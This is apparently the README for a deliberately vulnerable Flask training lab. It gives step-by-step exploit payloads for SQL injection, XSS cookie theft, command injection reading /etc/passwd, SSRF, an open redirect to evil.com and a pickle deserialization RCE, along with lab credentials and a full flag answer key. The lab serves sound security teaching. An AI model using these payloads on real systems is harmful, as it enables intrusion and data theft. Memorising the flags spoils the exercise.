# vulnsite 🔓

A hands-on web security & bug bounty practice lab with **10 vulnerability modules** and **20+ flags**.
Built with Python Flask + SQLite — no Docker, no setup headaches.

---

## Requirements

| Tool | Version | Required? |
|------|---------|-----------|
| Python | 3.8+ | ✅ Yes |
| pip | any | ✅ Yes |
| Flask | 2.3+ | ✅ Auto-installed |
| Burp Suite | any | ⚡ Recommended |
| curl | any | ⚡ Recommended |

Check your Python version:
```bash
python3 --version
```

---

## Quick Start

```bash
# 1. Clone or download the project
cd vulnsite

# 2. Install Flask
pip install flask
# or
pip install -r requirements.txt

# 3. Run
python3 app.py
```

Or use the run script:
```bash
bash run.sh
```

Open **http://localhost:5000** in your browser.

> ⚠️ Run locally only. Never expose vulnsite to the internet.

---

## Project Structure

```
vulnsite/
├── app.py                  # Main Flask application (all routes + logic)
├── run.sh                  # One-click startup script
├── requirements.txt        # Python dependencies
├── vulnsite.db             # SQLite database (auto-created on first run)
└── templates/
    ├── base.html           # Shared nav + styles
    ├── index.html          # Home page
    ├── bac/                # Broken Access Control module
    │   ├── home.html
    │   ├── login.html
    │   ├── dashboard.html
    │   ├── note.html
    │   ├── admin.html
    │   └── forbidden.html
    ├── payment/            # Payment Bypass module
    │   ├── home.html
    │   ├── login.html
    │   ├── premium.html
    │   └── download.html
    ├── bypass/             # 403 Bypass module
    │   └── home.html
    ├── sqli.html
    ├── xss.html
    ├── cmdi.html
    ├── ssrf.html
    ├── redirect.html
    ├── exposure.html
    └── deser.html
```

---

## Labs Overview

### 🔓 Broken Access Control (BAC) — `/bac`
Hidden admin API endpoints that only check authentication, not role. Any logged-in user can access them.

**Credentials:**
| Username | Password | Role |
|----------|----------|------|
| admin | admin123 | admin |
| alice | password1 | user |
| bob | bob2024 | user |
| charlie | charlie99 | moderator |

**How to exploit:**
1. Login as admin → open DevTools Network tab → visit `/bac/admin`
2. See the API calls: `/api/admin/settings`, `/api/admin/keys`, `/api/admin/users/all`
3. Logout → login as alice → hit those same endpoints directly

**IDOR:** Visit `/bac/note?id=1` while logged in as alice to read the admin's private note.

---

### 💳 Payment Bypass — `/payment`
Three client-side payment control bypasses.

**Lab 1 — Price Modification:**
Intercept `POST /api/payment/purchase` and change `"price": 99` → `"price": 0` in the request body.

**Lab 2 — Direct Path Access:**
Call `GET /api/payment/course/2` — the `download_url` in the response works without payment.

**Lab 3 — Permission Bypass:**
Intercept `GET /api/payment/access-status` response, change `"userType": "free"` → `"paid"`.

---

### 🚧 403 Bypass — `/bypass`
Eight 403 Forbidden bypass challenges. Use Burp Suite or curl.

| # | Technique | Endpoint | Bypass |
|---|-----------|----------|--------|
| 1 | HTTP Verb | `/admin/secret` | Use `POST` instead of `GET` |
| 2 | X-Forwarded-For | `/internal/data` | Add header `X-Forwarded-For: 127.0.0.1` |
| 3 | Path Encoding | `/protected/files` | Use `//` or `%2f` in path |
| 4 | Case Bypass | `/sensitive/info` | Try `/Sensitive/info` |
| 5 | Trailing Slash | `/restricted/area` | Add `/` → `/restricted/area/` |
| 6 | Param Pollution | `/api/user?id=123` | Add duplicate param `?id=123&id=456` |
| 7 | X-Original-URL | `/local/admin` | Add header `X-Original-URL: /local/admin` |
| 8 | Method Override | `/api/update` | Add header `X-HTTP-Method-Override: DELETE` |

**curl example:**
```bash
# Challenge 2 — XFF bypass
curl -H "X-Forwarded-For: 127.0.0.1" http://localhost:5000/internal/data

# Challenge 8 — Method override
curl -H "X-HTTP-Method-Override: DELETE" http://localhost:5000/api/update
```

---

### 💉 SQL Injection — `/sqli`
Unsanitized query concatenation. UNION-based attack.

```
# Dump all users
' OR '1'='1

# Read notes table (find the flag)
' UNION SELECT id,title,content,user_id FROM notes--

# List all tables
' UNION SELECT 1,name,sql,4 FROM sqlite_master--
```

---

### 🔗 XSS — `/xss`
Reflected and stored XSS — no output escaping.

```html
<!-- Reflected (submit in form) -->
<script>alert(document.cookie)</script>

<!-- Stored (add via URL param) -->
?store=<img src=x onerror=alert('XSS')>

<!-- SVG bypass -->
<svg onload=alert(1)>
```

---

### 💻 Command Injection — `/cmdi`
`ping` tool with `shell=True`. Chain system commands.

```bash
# Basic RCE
127.0.0.1; whoami

# Read file
127.0.0.1; cat /etc/passwd

# List directory
127.0.0.1; ls -la
```

---

### 🌐 SSRF — `/ssrf`
Server fetches any URL you give it — reach internal endpoints.

```
# Access internal-only endpoint
http://127.0.0.1:5000/internal/secret

# Read local files
file:///etc/passwd
```

---

### ↪️ Open Redirect — `/redirect`
The `?next=` parameter has no validation.

```
http://localhost:5000/redirect?next=https://evil.com
```

---

### 🔍 Sensitive Data Exposure — `/exposure`
Three exposed files/endpoints — just visit them directly:

```
/.env                    # API keys, secret key, flag
/backup/config.bak       # DB password, Stripe key
/api/debug/info          # Secret key, DB path, internal config
```

---

### 📦 Insecure Deserialization — `/deser`
Accepts base64 pickle objects without validation. Generate a malicious payload:

```python
import pickle, base64, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned.txt",))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

Paste the output into the form — the server executes it.

---

## All Flags

| Flag | Location |
|------|----------|
| `FLAG{bac_admin_api_accessed}` | `/api/admin/settings` |
| `FLAG{bac_api_keys_exposed}` | `/api/admin/keys` |
| `FLAG{bac_all_users_dumped}` | `/api/admin/users/all` |
| `FLAG{bac_admin_notes_accessed}` | IDOR note id=1 |
| `FLAG{idor_moderator_note_found}` | IDOR note id=4 |
| `FLAG{payment_price_modified}` | Price → 0 in purchase |
| `FLAG{payment_direct_path_lab2}` | Secret download URL |
| `FLAG{payment_permission_bypass_lab3}` | userType → paid |
| `FLAG{bypass_verb_override}` | POST /admin/secret |
| `FLAG{bypass_xff_header}` | XFF: 127.0.0.1 |
| `FLAG{bypass_path_encoding}` | // in path |
| `FLAG{bypass_case_sensitive}` | /Sensitive/info |
| `FLAG{bypass_trailing_slash}` | /restricted/area/ |
| `FLAG{bypass_param_pollution}` | id=x&id=y |
| `FLAG{bypass_host_header_rewrite}` | X-Original-URL header |
| `FLAG{bypass_method_override}` | X-HTTP-Method-Override |
| `FLAG{ssrf_internal_access}` | SSRF to 127.0.0.1 |
| `FLAG{open_redirect_external_url}` | ?next=https://... |
| `FLAG{dotenv_file_exposed}` | /.env |
| `FLAG{debug_endpoint_exposed}` | /api/debug/info |
| `FLAG{exposed_backup_file}` | /backup/config.bak |

---

## Recommended Tools

- **Burp Suite** — intercept and modify requests/responses (free community edition works)
- **curl** — quick header and method testing from terminal
- **Browser DevTools** — Network tab to watch API calls (F12)
- **ffuf / dirsearch** — directory brute-forcing for the exposure lab

---

## Disclaimer

This application is **intentionally vulnerable** and is for **educational purposes only**.

- Run on your local machine only
- Do not expose to the internet
- Only use these techniques on systems you own or have explicit permission to test
